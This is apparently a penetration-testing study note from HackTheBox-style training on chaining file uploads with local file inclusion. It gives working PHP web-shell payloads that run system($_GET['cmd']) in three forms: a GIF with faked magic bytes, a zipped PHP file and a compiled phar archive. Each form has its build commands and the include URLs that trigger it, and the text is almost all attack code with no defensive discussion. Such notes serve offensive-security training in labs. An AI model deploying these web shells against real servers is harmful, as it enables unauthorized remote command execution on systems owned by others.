If we can upload files and the function has code Execute capabilities we can upload a file with any extension but with the code we want (for example PHP code), a table of functions which allow execution can be found at [[Attacks/Web/File Inclusion/Local File Inclusion (LFI)/Intro]].

## Image Upload

### Crafting Malicious Image

Example of creating a malicious gif file with his magic bytes at the beginning:
```shell-session
Wildland4958@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

### Uploaded File Path

In most case after uploading the file we would be able to see the uploaded path directly or through the source code, we can also try to fuzz for the uploads directory if not.

Execute the code:
```url
http://<SERVER_IP>:<PORT>/index.php?language=./<upload path>&cmd=id
```

## Zip Upload

In case the previous technique doesn't work we can try this one (only works for PHP).

We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute code which isn't enabled by default.

Start by creating a script and zipping it:
```shell-session
Wildland4958@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Include the file after uploading:
```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./<file path>%23shell.php&cmd=id
```

## Phar Upload

To use the Phar wrapper first write the following code to a `shell.php` file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Compile the file and change his name:
```shell-session
Wildland4958@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Include the file after uploading:
```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./<file path>%2Fshell.txt&cmd=id
```